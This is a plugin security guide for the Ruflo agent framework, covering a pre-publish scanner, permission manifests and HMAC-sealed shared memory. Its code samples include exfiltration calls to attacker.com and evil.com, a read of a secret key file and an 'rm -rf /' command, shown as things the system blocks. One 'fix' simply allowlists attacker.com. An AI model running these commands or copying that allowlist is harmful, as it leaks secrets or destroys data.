# Plugin Security Guide — Publishing, Permissions, and Sealed Memory

> **Audience**: Plugin authors and Ruflo administrators who want to ensure plugins are safe before distributing or installing them.
>
> **Status**: Ruflo v3.7+ (scanner and permissions in Proposed status; sealing in Proposed status — enable with env flags for early access)

## TL;DR

Three security gates now protect Ruflo plugins:

1. **Pre-publish scanner** — finds code-level attacks (RCE, credential theft, dependency vulnerabilities) *before* your plugin reaches the registry
2. **Permission manifest** — you declare what your plugin needs; runtime enforcement blocks attempts to exceed those permissions
3. **Sealed memory** — shared agent memory is cryptographically signed; tampering is detected at read time

**Quick start**:
```bash
# 1. Add permissions to your plugin.json
{
  "permissions": {
    "filesystem": { "read": ["./config/**"], "write": [] },
    "network": { "allowedHosts": ["api.example.com"] },
    "hooks": ["pre-task"],
    "memoryNamespaces": ["my-plugin-state"],
    "subprocess": false
  }
}

# 2. Scan before publishing
npx ruflo plugins publish ./my-plugin --strict

# 3. Enable strict enforcement (default in v4.0)
export CLAUDE_FLOW_STRICT_PUBLISH=true
export CLAUDE_FLOW_STRICT_SEALING=true
```

---

## Part 1: Publishing with the Pre-Publish Scanner

### What the scanner checks

When you run `npx ruflo plugins publish`, the scanner analyzes your plugin's code in two stages:

#### Stage 1: AST-level code analysis (symbolic rules)

Parses every `.js`, `.ts`, and `.sh` file and looks for patterns that are almost always suspicious:

| Pattern | What it detects | False positive risk |
|---------|-----------------|-------------------|
| **Credential extraction** | Code reading `process.env.AWS_SECRET` or similar secrets without declaring it in `permissions.needsEnvVars` | Low — environment reads should be explicit |
| **Exfiltration calls** | HTTP/WebSocket calls to hosts not in the `permissions.network.allowedHosts` list | Low — network is declared |
| **Undeclared hooks** | Code registering a hook (e.g., `hooks.on('pre-task', ...)`) not listed in `permissions.hooks` | Low — hooks should be transparent |
| **RCE patterns** | Code using `eval`, `Function(...)`, or shell-out with unsanitized input (no `shellEscape`) | Medium — some legitimate use cases exist; high confidence if no sanitization is visible |

#### Stage 2: Dependency graph analysis (supply-chain)

Walks your `package.json` and all transitive dependencies to find:

| Check | What it flags | When to act |
|-------|---|---|
| **Unpinned versions** | Dependencies without exact versions (e.g., `"lodash": "^4.17.0"` instead of `"4.17.21"`) | Warn — pins reduce surprise updates, but semantic versioning is normal |
| **Known vulnerabilities** | Matches against the Open Source Vulnerabilities (OSV) database | Act immediately — CVE fixes exist, update the package |
| **Over-privileged transitive deps** | A dependency of your dependency requests dangerous capabilities (e.g., filesystem write) that your plugin itself doesn't declare needing | Warn — evaluate if you really need this sub-dependency |
| **Executable scripts** | Dependencies with install scripts or native binaries (higher risk than pure JS) | Warn — executable scripts are 2.12× more likely to be vulnerable; review before shipping |

### Running the scanner

**Publish-time scan (warn-only mode)**:
```bash
npx ruflo plugins publish ./my-plugin

# Output:
# ✓ PASS: no critical findings
#   - credential-extraction: 0 findings
#   - exfiltration-call: 0 findings
#   - rce-pattern: 2 warnings
#       - src/exec.ts:42: possible shell-out without escaping (confidence: 0.78)
#   - dependency-risk: 23 warnings
#       - lodash@4.x: unpinned version
#       - onnxruntime-web@1.14.0: known-vulnerable (CVE-2024-1234)
```

**Strict mode (blocks on high-confidence findings)**:
```bash
export CLAUDE_FLOW_STRICT_PUBLISH=true
npx ruflo plugins publish ./my-plugin

# If any findings have confidence >= 0.85, fails with:
# ✗ BLOCK: critical findings detected
#   - rce-pattern at src/exec.ts:42 (confidence: 0.88) — must fix or use escape function
```

**Disabling strict mode for testing** (not recommended for production):
```bash
export CLAUDE_FLOW_STRICT_PUBLISH=false
npx ruflo plugins publish ./my-plugin

# Always publishes, but warns on findings
# Installed users will see warnings during `plugins install`
```

### Fixing common scanner findings

**RCE pattern — unsafe shell-out**:
```typescript
// ❌ FAILS scanner
const result = child_process.execSync(`npm install ${userInput}`);

// ✅ PASSES scanner
import { shellEscape } from '@claude-flow/security';
const result = child_process.execSync(`npm install ${shellEscape(userInput)}`);
```

**Undeclared environment variable read**:
```typescript
// ❌ FAILS scanner
const apiKey = process.env.MY_API_KEY;

// ✅ PASSES scanner (declare in plugin.json)
```

Add to `plugin.json`:
```json
{
  "name": "my-plugin",
  "needsEnvVars": ["MY_API_KEY"],
  "permissions": {}
}
```

**Exfiltration call to undeclared host**:
```typescript
// ❌ FAILS scanner
const result = await fetch('https://attacker.com/log');

// ✅ PASSES scanner (declare in plugin.json)
```

Add to `plugin.json`:
```json
{
  "permissions": {
    "network": { "allowedHosts": ["attacker.com"] }
  }
}
```

**Known-vulnerable dependency**:
```bash
# ❌ FAILS scanner
npm install onnxruntime-web@1.14.0

# ✅ PASSES scanner (patch released)
npm install onnxruntime-web@1.15.0
```

---

## Part 2: Permission Manifests and Runtime Enforcement

### Declaring permissions

Every plugin defines exactly what it needs in the `permissions` block of `plugin.json`:

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "permissions": {
    "filesystem": {
      "read": ["./config/**", "./templates/**"],
      "write": ["./output/**"]
    },
    "network": {
      "allowedHosts": ["api.github.com", "npm.org"]
    },
    "hooks": ["pre-task", "post-task"],
    "memoryNamespaces": ["plugin-state", "plugin-cache"],
    "subprocess": false
  }
}
```

### Permission categories

| Category | Sub-keys | Values | Meaning |
|----------|----------|--------|---------|
| **filesystem** | `read`, `write` | Glob patterns | Which directories the plugin can read/write. Globs are matched case-sensitively; `**/` is recursive. Missing a pattern = denied. |
| **network** | `allowedHosts` | Hostname list | Which hosts the plugin can make HTTP/WebSocket calls to. `*` allows all (not recommended). Missing from list = denied. |
| **hooks** | (array) | Hook names | Which Ruflo hooks the plugin can register (e.g., `pre-task`, `post-edit`, `pre-publish`). Hooks not in the list = registration fails at load time. |
| **memoryNamespaces** | (array) | Namespace names | Which AgentDB namespaces the plugin can read/write. ADR-145 Part B grants are checked at load time; this field extends that with per-namespace scoping. |
| **subprocess** | (boolean) | `true`/`false` | Whether the plugin may shell out (use `child_process.spawn`, `execSync`, etc.). `false` = subprocess calls are blocked at runtime. |

### Examples

**A CI/CD plugin that reads config and calls GitHub**:
```json
{
  "permissions": {
    "filesystem": { "read": ["./.github/**", "./.gitlab-ci.yml"] },
    "network": { "allowedHosts": ["api.github.com", "gitlab.com"] },
    "hooks": ["post-task"],
    "memoryNamespaces": ["ci-cache"],
    "subprocess": true
  }
}
```

**A local-only analysis plugin (no network, no subprocess)**:
```json
{
  "permissions": {
    "filesystem": { "read": ["src/**", "tests/**"] },
    "network": { "allowedHosts": [] },
    "hooks": ["pre-publish"],
    "memoryNamespaces": [],
    "subprocess": false
  }
}
```

**A plugin with no permissions (read-only, no side effects)**:
```json
{
  "permissions": {
    "filesystem": { "read": [], "write": [] },
    "network": { "allowedHosts": [] },
    "hooks": [],
    "memoryNamespaces": [],
    "subprocess": false
  }
}
```

### Backwards compatibility

**Plugins without a `permissions` block** get the legacy maximal grant (can read/write anywhere, access any host, register any hook, use subprocess). This ensures older plugins keep working:

```json
{
  "name": "old-plugin",
  "version": "1.0.0"
  // ← no permissions block; gets legacy maximal grant
}
```

This grace period ends in v4.0, when `CLAUDE_FLOW_PLUGIN_MAX_PERMISSIONS` becomes strict by default. Update your plugins before then.

### Runtime enforcement

Once a plugin is loaded with a permission manifest, every capability use is checked:

```typescript
// Plugin code:
const fs = require('fs');

// ✅ OK if permissions.filesystem.read includes src/**
fs.readFileSync('src/index.js');

// ❌ DENIED if permissions.filesystem.read doesn't include this path
fs.readFileSync('../../secret.key');

// ❌ DENIED if permissions.network.allowedHosts doesn't include evil.com
fetch('https://evil.com/exfil');

// ❌ DENIED if permissions.subprocess is false
child_process.execSync('rm -rf /');

// ❌ DENIED if permissions.hooks doesn't include 'custom-hook'
hooks.register('custom-hook', callback);
```

### Configuration

**Enable strict permission enforcement** (default in v4.0):
```bash
export CLAUDE_FLOW_STRICT_PLUGIN=true
npx ruflo swarm init
```

**Set a ceiling on total permissions a plugin can request**:
```bash
export CLAUDE_FLOW_PLUGIN_MAX_PERMISSIONS=5
# Plugins requesting >5 categories are refused load
```

**Audit permission denials**:
```bash
npx ruflo logs --filter "permission_denied"
```

---

## Part 3: Sealed Memory Namespaces

### What is sealed memory?

Ruflo agents often write to shared memory (the `collaboration` namespace) so other agents can read and act on their findings. But what if a compromised agent writes falsified data?

**Sealed memory** uses cryptographic HMAC signatures to ensure that:
1. The content read from shared memory is exactly what the writing agent wrote
2. The writing agent cannot be impersonated (only the server can compute valid seals)
3. Propagation attempts (one agent copying another's write and re-submitting it) are detectable

### How it works

When an agent writes to a sealed namespace (like `collaboration` in P1):

```
1. Agent writes content: { insights: [...], metadata: {...} }
2. Server computes HMAC-SHA256 seal over (content + writerId + writeHash)
3. Server stores: { content, seal, writerId, sealedAt, keyEpoch }
4. When another agent reads, server verifies seal before returning content
5. If seal is invalid, read is rejected with TamperDetected error
```

The HMAC key is held only by the server (the AgentDB process), never given to agents. This means:
- Even a compromised plugin that has a legitimate write grant cannot forge valid seals
- The seal proves content has not been altered since the writing agent sealed it
- Replayed or propagated writes (same content written by a different agent) are detectable

### Configuration

**Enable strict sealing** (warn on tamper, block in v4.0):
```bash
export CLAUDE_FLOW_STRICT_SEALING=true
npx ruflo swarm init
```

**Configure propagation-chain detection window**:
```bash
# Default 5 minutes; detects if same content is re-sealed by different writer
export CLAUDE_FLOW_SEAL_REPLAY_WINDOW_MS=300000
```

**Seal in logs** (enabled by default):
```bash
export CLAUDE_FLOW_AUDIT_LOG=./audit.log
# When a TamperDetected event occurs, it's logged with full details
```

### What happens when tampering is detected

With `CLAUDE_FLOW_STRICT_SEALING=false` (warn-only, default):
```
[WARN] TamperDetected: collaboration namespace read rejected
  Content hash: abc123...
  Expected seal: hmac_456...
  Received seal: hmac_789... (invalid)
  Likely cause: write was altered after sealing
  Action: suppressed read; agent did not receive tampered content
```

With `CLAUDE_FLOW_STRICT_SEALING=true` (block):
```
[ERROR] TamperDetected: read rejected and escalated
  writerId: agent-xyz
  namespace: collaboration
  Action: human review required (escalation mode CLAUDE_FLOW_IPI_MODE=human_review)
```

### Propagation-chain detection

ADR-321 P2 adds detection for **ClawWorm**-style propagation attacks, where a compromised agent copies another agent's write into a new write:

```
1. Agent A writes content C and it gets sealed under A's key
2. Agent B (compromised) reads content C
3. Agent B writes content C again (copies from A's write)
   → Server detects: same content hash, different writerId, within 5-minute window
   → Flagged as propagation attempt
```

Configuration:
```bash
# Time window for propagation detection (in milliseconds)
export CLAUDE_FLOW_SEAL_REPLAY_WINDOW_MS=300000  # 5 minutes (default)

# What to do with propagation flags
export CLAUDE_FLOW_IPI_MODE=human_review  # or: log_only / escalate / block
```

---

## Best Practices

### For Plugin Authors

1. **Declare minimal permissions** — only request what you need
   ```json
   // Good: specific paths and hosts
   { "filesystem": { "read": ["./config/**"] }, "network": { "allowedHosts": ["api.example.com"] } }
   
   // Bad: overly broad
   { "filesystem": { "read": ["./**"] }, "network": { "allowedHosts": ["*"] } }
   ```

2. **Use shellEscape for subprocess calls**
   ```typescript
   import { shellEscape } from '@claude-flow/security';
   child_process.execSync(`command ${shellEscape(userInput)}`);
   ```

3. **Avoid reading secrets from environment** if possible
   - If you must: declare in `needsEnvVars`, never log or store them

4. **Pin your dependencies** — reduces surprise updates
   ```json
   { "dependencies": { "lodash": "4.17.21" } }  // ✓ exact
   { "dependencies": { "lodash": "^4.17.0" } }  // ✗ unpinned
   ```

5. **Publish with `--strict` to catch issues early**
   ```bash
   npx ruflo plugins publish ./my-plugin --strict
   ```

### For Administrators

1. **Enable strict publishing for internal registries**
   ```bash
   export CLAUDE_FLOW_STRICT_PUBLISH=true
   ```

2. **Set permission ceilings** to limit plugin blast radius
   ```bash
   export CLAUDE_FLOW_PLUGIN_MAX_PERMISSIONS=3
   ```

3. **Enable strict sealing for high-security deployments**
   ```bash
   export CLAUDE_FLOW_STRICT_SEALING=true
   export CLAUDE_FLOW_IPI_MODE=human_review  # or escalate
   ```

4. **Audit plugin loads and denials**
   ```bash
   npx ruflo logs --filter "plugin_load|permission_denied|TamperDetected"
   ```

5. **Review scan results before allowing new plugins**
   ```bash
   npx ruflo plugins info @claude-flow/plugin-example
   # Shows: manifest, scan verdict, permission breakdown, install history
   ```

---

## Troubleshooting

### Scanner reports false positives

**Issue**: Scanner flags `child_process.execSync('npm install')` even though input is not user-controlled.

**Solution**: Use `shellEscape` or suppress with an inline comment:
```typescript
// @plugin-scanner: allow-rce
const result = child_process.execSync(`npm install ${pkg}`);
```

This is not recommended for production code, but can be useful for one-off build scripts.

### Plugin fails to load due to permission denial

**Issue**: `PluginError: permission denied — filesystem write to ./logs/plugin.log`

**Solution**: Add the path to your `permissions.filesystem.write` block:
```json
{
  "permissions": {
    "filesystem": { "write": ["./logs/**"] }
  }
}
```

### Sealed memory read fails with TamperDetected

**Issue**: Agent reads from `collaboration` namespace and gets `TamperDetected` error.

**Likely causes**:
1. A plugin with a write grant was compromised and wrote falsified data
2. Network corruption altered the sealed envelope in transit (rare)
3. The HMAC key was rotated (old seals become invalid)

**Solution**:
1. Check `CLAUDE_FLOW_AUDIT_LOG` for details
2. Review the writing agent's code and permissions
3. If a key rotation occurred, re-seal affected namespaces
4. In v4.0, rejected reads will automatically escalate to human review

---

## Rollout Timeline

| Version | Feature | Default | Strict Flag |
|---------|---------|---------|-------------|
| v3.7 (current) | Scanner (P1) | Warn | `CLAUDE_FLOW_STRICT_PUBLISH=true` |
| v3.7 | Permissions (P3) | Warn | `CLAUDE_FLOW_STRICT_PLUGIN=true` |
| v3.7 | Sealing (P1) | Warn | `CLAUDE_FLOW_STRICT_SEALING=true` |
| v4.0 (planned) | **All strict by default** | Block | (not needed) |

**Migration checklist**:
- [ ] Add `permissions` block to all plugins by v3.9
- [ ] Run `plugins publish --strict` and fix findings by v3.9
- [ ] Test plugins with `CLAUDE_FLOW_STRICT_*` flags enabled by v3.10
- [ ] Update docs to reflect v4.0 enforcement by v3.11

---

## Further Reading

- **OWASP Mapping**: [`docs/security/owasp-genai-top10-mapping.md`](./owasp-genai-top10-mapping.md) — how plugin security maps to industry risks
- **ADR-320**: Pre-Publish Plugin Scanner and Runtime Permission Manifest Enforcement
- **ADR-321**: HMAC-Sealed Collaboration Memory Namespace
- **ADR-145**: Plugin Supply-Chain Integrity (install-time verification)
- **Plugin API Reference**: [`v3/@claude-flow/cli/docs/plugins-sdk.md`](../../v3/@claude-flow/cli/docs/plugins-sdk.md)
